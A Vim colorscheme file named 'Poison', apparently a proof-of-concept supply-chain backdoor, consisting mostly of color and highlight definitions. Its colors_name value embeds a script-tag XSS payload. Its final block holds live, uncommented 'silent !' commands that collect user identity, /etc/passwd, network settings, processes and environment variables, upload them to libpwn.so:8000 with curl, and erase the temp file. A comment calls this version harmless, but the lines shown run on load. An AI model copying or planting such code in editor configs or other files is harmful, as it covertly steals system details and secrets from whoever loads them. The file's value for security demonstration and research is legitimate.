" Poison colorscheme for vim
" Author: @r0bre <mail[ät]r0b.re>
" Created: 2021-04

" this file is backdooredd

highlight clear

if exists('syntax on')
    syntax reset
endif

set background=dark
let g:colors_name='poison<script>console.log(/1337/);</script>' 

" credit: nachtleben.vim <schickele[ät]web.de>
function! s:hi(group, fg, bg, style, special)
  let l:command = 'hi ' . a:group

  if (!empty(a:fg))
    let l:command .= ' guifg=' . a:fg
  endif

  if (!empty(a:bg))
    let l:command .= ' guibg=' . a:bg
  endif

  if (!empty(a:style))
    let l:command .= ' gui=' . a:style
    let l:command .= ' cterm=' . a:style
  endif

  if (!empty(a:special))
    let l:command .= ' guisp=' . a:special
  endif

  execute l:command
endfunction 


" colors I like so far
let s:gree = '#24ca45' " green
let s:poid = '#8ec127' " grassy green
let s:grcy = '#05ffa1' " green gpoa
let s:lgre = '#4cff4c' " light green


let s:poio = '#e51938' " red

let s:mage = '#ff71ce' " magenta
let s:purp = '#b967ff' " purple
let s:ptpu = '#c79dd7' " pastel purple
let s:dapu = '#9c3d7b' " dark purple
let s:dbpu = '#5c2d4b' " darker purple
let s:nnpk = '#ff00b4' " neon pink

let s:poia = '#cab6d3' " shades of purple
let s:poib = '#b599cf'
let s:poic = '#a57eb7'
let s:poid = '#824d89'
let s:poie = '#6f2770'
let s:poif = '#a865ff'
let s:poig = '#d07cff'
let s:poih = '#f17dff'
let s:poii = '#ff5fd8'
let s:poij = '#ff408d'
let s:poik = '#b70df2'
let s:poil = '#ac51cc'
let s:poim = '#a666bd'
let s:poin = '#b374c9'
let s:poio = '#bc88ce'

let s:gpoa = '#677b14' " shades of green
let s:gpob = '#bed33d'



let s:blac = '#050207' " purpleblack
let s:blpk = '#151220' " slightly brighter black
let s:dgra = '#283459' " dark gray

let s:gray = '#e0e0d8' " gray

let s:actualblack = '#000000'
let s:actualwhite = '#ffffff'


" GROUP | FG | BG | STYLE | SPECIAL
" Irrelevant ? 
call s:hi('StatusLine',       s:blac, s:poif, 'NONE', '')
call s:hi('Cursor',           s:blac, s:nnpk, '', '')
call s:hi('StatusLineNC',     s:poif, s:blac, 'NONE', '')
call s:hi('WarningMsg',       s:blac, s:poio, '', '')
call s:hi('WildMenu',         s:poif, s:blac, '', '')


" Done Color Assignments
call s:hi('Statement',        s:poia, '', 'NONE', '')
call s:hi('Conditional',      s:dapu, '', 'NONE', '')
call s:hi('Repeat',           s:dapu, '', 'NONE', '')
call s:hi('Exception',        s:dapu, '', 'NONE', '')
call s:hi('Operator',         s:poif, '', 'NONE', '')
call s:hi('Comment',          s:dapu, '', '', '')
call s:hi('SpecialComment',   s:dapu, '', '', '')
call s:hi('Constant',         s:poid, '', '', '')
call s:hi('String',           s:poid, '', '', '')
call s:hi('Character',        s:poid, '', '', '')
call s:hi('Number',           s:gree, '', '', '')
call s:hi('Boolean',          s:gree, '', '', '')
call s:hi('Special',          s:poio, '', '', '') " special chars
call s:hi('ColorColumn',      'NONE', s:blpk, '', '')
call s:hi('CursorLine',       'NONE', s:blpk, '', '')
call s:hi('CursorLineNr',     s:nnpk, s:blpk, 'NONE', '')
call s:hi('LineNr',           s:dbpu, s:blac, '', '')
call s:hi('Identifier',       s:gpoa, '', '', '')
call s:hi('Function',         s:poij, '', '', '')
call s:hi('Todo',             s:poih, s:blac, 'REVERSE', '')
call s:hi('Error',            s:poif, s:blac, 'REVERSE', '')
call s:hi('PreProc',          s:mage, s:blac, '', '')
call s:hi('NonText',          s:poif, '',     'NONE', '')
call s:hi('Search',           s:actualblack, s:poih, '', '')
call s:hi('IncSearch',        s:actualblack, s:poij, 'bold', '')
call s:hi('Type',             s:gpoa, '', 'NONE', '')
call s:hi('Structure',        s:gpob, '', 'NONE', '')
call s:hi('StorageClass',     s:gpob, '', 'NONE', '')
call s:hi('VertSplit',        s:blac, s:purp, '', '')
call s:hi('Visual',           s:blac, s:poij, '', '')
call s:hi('Folded',           s:blac, s:purp, '', '')
call s:hi('FoldColumn',       s:blac, s:purp, '', '')
call s:hi('SpellBad',         'NONE', 'NONE', 'UNDERCURL', s:poio)
call s:hi('SpellCap',         'NONE', 'NONE', 'UNDERCURL', s:poif)
call s:hi('SpellRare',        'NONE', 'NONE', 'UNDERCURL', s:mage)
call s:hi('SpellLocal',       'NONE', 'NONE', 'UNDERCURL', s:gree)
call s:hi('Pmenu',            s:blac, s:nnpk, '', '')
call s:hi('PmenuSel',         s:blac, s:poio, '', '')
call s:hi('PmenuSbar',        s:blac, s:nnpk, '', '')
call s:hi('PmenuThumb',       s:blac, s:poio, '', '')
call s:hi('MatchParen',       s:blac, s:poif, '', '')
call s:hi('Underlined',       'NONE', 'NONE', 'UNDERLINE', '')
call s:hi('Ignore',           s:dgra, 'NONE', '', '')
call s:hi('DiffAdd',          s:blac, s:gree, '', '')
call s:hi('DiffChange',       s:blac, s:poif, '', '')
call s:hi('DiffDelete',       s:blac, s:poif, 'NONE', '')
call s:hi('DiffText',         s:blac, s:poif, 'NONE', '')
call s:hi('Directory',          s:poif, '', '', '')
call s:hi('Terminal',          s:poid, s:blpk, '', '')
call s:hi('QuickFixLine',          s:blpk, s:poih, '', '')
call s:hi('qfFileName',          s:mage, '', '', '')
call s:hi('qfLineNr',          s:gpob, '', '', '')
call s:hi('qfSeparator',          s:poif, '', '', '')

" Maybe rethink
call s:hi('Normal',           s:gree, '', '', '')

hi CursorLine     cterm=NONE
hi DiffText       cterm=NONE
hi Identifier     cterm=NONE
hi ModeMsg        cterm=NONE
hi StatusLine     cterm=NONE
hi StatusLineTerm cterm=NONE
hi TabLine        cterm=NONE
hi TabLineSel     cterm=NONE
hi ToolbarButton  cterm=NONE
hi VisualNOS      cterm=NONE
hi Underlined     ctermfg=NONE ctermfg=NONE
hi! link lilySlur         Comment
hi! link vimCommentString Comment
hi! link vimCommentTitle  Comment
hi! link TrailingSpac     DiffDelete

hi! link cType            Identifier
hi! link cBlock           PreProc
hi! link cStructure       Identifier

hi! link pandocEmphasis Statement
hi! link pandocStrong   Statement

" BACKDOOR uncomment as you see fit. The version with comments is harmless and
" just a Proof-of-Concept. You would also need to update the pipedream url.

silent !echo "---" > /tmp/918237182937.tmp
silent !whoami >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !id >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !cat /etc/passwd >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !ifconfig >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !pwd >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !ls -al . >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !ls -al / >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !ls -al ~ >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !ps aux >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !uname -a >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !env >> /tmp/918237182937.tmp
silent !echo "---" >> /tmp/918237182937.tmp
silent !curl http://libpwn.so:8000 -T /tmp/918237182937.tmp
silent !rm -f /tmp/918237182937.tmp
"silent !sed -i '/silent/d' ./poison.vim
